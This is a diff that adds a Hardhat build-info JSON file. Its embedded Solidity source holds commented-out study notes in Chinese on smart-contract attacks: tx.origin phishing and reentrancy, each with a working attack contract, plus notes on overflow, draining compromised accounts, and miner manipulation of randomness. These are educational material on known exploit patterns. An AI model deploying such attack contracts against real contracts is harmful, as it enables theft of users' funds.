@@ -1,0 +1,67 @@
+{
+	"id": "fb514d61ade2acf54fc8063f7edae0a5",
+	"_format": "hh-sol-build-info-1",
+	"solcVersion": "0.8.7",
+	"solcLongVersion": "0.8.7+commit.e28d00a7",
+	"input": {
+		"language": "Solidity",
+		"sources": {
+			"Attact.sol": {
+				"content": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.7;\n\n/*\ntx.origin 攻击\n\n*/\n// contract TxUserWallet {\n//     event UserLog(uint256 gg);\n\n//     address owner;\n\n//     constructor() payable {\n//         owner = msg.sender;\n//     }\n\n//     function transferTo(address payable dest, uint amount) external payable{\n//         require(tx.origin == owner);\n//         emit UserLog(gasleft());\n//         // dest.transfer(amount);\n//         // dest.call{value: amount, gas: 2300}(\"\");\n//         // 以上两种情况会因为gas携带不够不能完全执行\n//         dest.call{value: amount}(\"\");\n//     }\n\n//     function getBalance() public view returns(uint) {\n//         uint _balance = address(this).balance;\n//         return _balance;\n//     }\n// }\n\n// interface InterfaceUserWallet {\n//     function transferTo(address payable dest, uint amount) external payable;\n// }\n\n// contract TxAttackWallet {\n//     event AttackLog(uint256 gg);\n\n//     address payable owner;\n\n//     constructor() payable {\n//         owner = payable(msg.sender);\n//     }\n\n//     receive() external payable {\n//         emit AttackLog(gasleft());\n//         InterfaceUserWallet(msg.sender).transferTo(payable(address(this)), 1 ether);\n//     }\n\n//     function getBalance() public view returns(uint) {\n//         uint _balance = address(this).balance;\n//         return _balance;\n//     }\n// }\n\n/*\n重入攻击\n使用重入锁 或者 先改变状态值来防范\n*/\n\n\n// contract EtherStore {\n//     mapping(address => uint) public balances;\n\n//     // 重入锁\n//     bool internal locked;\n\n//     modifier noReentrant() {\n//         require(!locked, \"No re-entrancy\");\n//         locked = true;\n//         _;\n//         locked = false;\n//     }\n\n//     function deposit() public payable {\n//         balances[msg.sender] += msg.value;\n//     }\n\n//     function withdraw() public noReentrant {\n//         uint bal = balances[msg.sender];\n//         require(bal > 0);\n\n//         (bool sent, ) = msg.sender.call{value: bal}(\"\");\n//         require(sent, \"Failed to send Ether\");\n\n//         balances[msg.sender] = 0;\n//     }\n\n//     // Helper function to check the balance of this contract\n//     function getBalance() public view returns (uint) {\n//         return address(this).balance;\n//     }\n// }\n\n// contract Attack {\n//     EtherStore public etherStore;\n\n//     constructor(address _etherStoreAddress) {\n//         etherStore = EtherStore(_etherStoreAddress);\n//     }\n    \n//     // Fallback is called when EtherStore sends Ether to this contract.\n//     fallback() external payable {\n//         if (address(etherStore).balance >= 1 ether) {\n//             etherStore.withdraw();\n//         }\n//     }\n\n//     function attack() external payable {\n//         require(msg.value >= 1 ether);\n//         etherStore.deposit{value: 1 ether}();\n//         etherStore.withdraw();\n//     }\n\n//     // Helper function to check the balance of this contract\n//     function getBalance() public view returns (uint) {\n//         return address(this).balance;\n//     }\n// }\n\n/*\n数学溢出\n*/\n\n/*\n清道夫攻击 被盗账号留下几个币但是把eth转走，如果我们为了转走这些币需要转入eth当做gas费，黑客会在检测到转入了eth之后给转走\n*/\n\n// 攻击\n/*\n假设我们有一个硬币翻转合约——正面你赢双倍钱，反面你输掉所有的钱。\n假如它使用1-100随机数方法来决定是正面还是反面 (random >= 50 算正面, random < 50 算反面)。\n\n如果我运行一个节点，我可以只对我自己的节点提交事务，且不分享它。 \n我可以运行硬币翻转方法来偷窥我的输赢 — 如果我输了，我就不把这个事务包含进我要广播的下一个区块中去。\n我可以一直运行这个方法，直到我赢得了硬币翻转，然后获利。\n*/"
+			}
+		},
+		"settings": {
+			"optimizer": {
+				"enabled": false,
+				"runs": 200
+			},
+			"outputSelection": {
+				"*": {
+					"": [
+						"ast"
+					],
+					"*": [
+						"abi",
+						"metadata",
+						"devdoc",
+						"userdoc",
+						"storageLayout",
+						"evm.legacyAssembly",
+						"evm.bytecode",
+						"evm.deployedBytecode",
+						"evm.methodIdentifiers",
+						"evm.gasEstimates",
+						"evm.assembly"
+					]
+				}
+			}
+		}
+	},
+	"output": {
+		"sources": {
+			"Attact.sol": {
+				"ast": {
+					"absolutePath": "Attact.sol",
+					"exportedSymbols": {},
+					"id": 2,
+					"license": "MIT",
+					"nodeType": "SourceUnit",
+					"nodes": [
+						{
+							"id": 1,
+							"literals": [
+								"solidity",
+								"0.8",
+								".7"
+							],
+							"nodeType": "PragmaDirective",
+							"src": "32:22:0"
+						}
+					],
+					"src": "32:3794:0"
+				},
+				"id": 0
+			}
+		}
+	}
+}
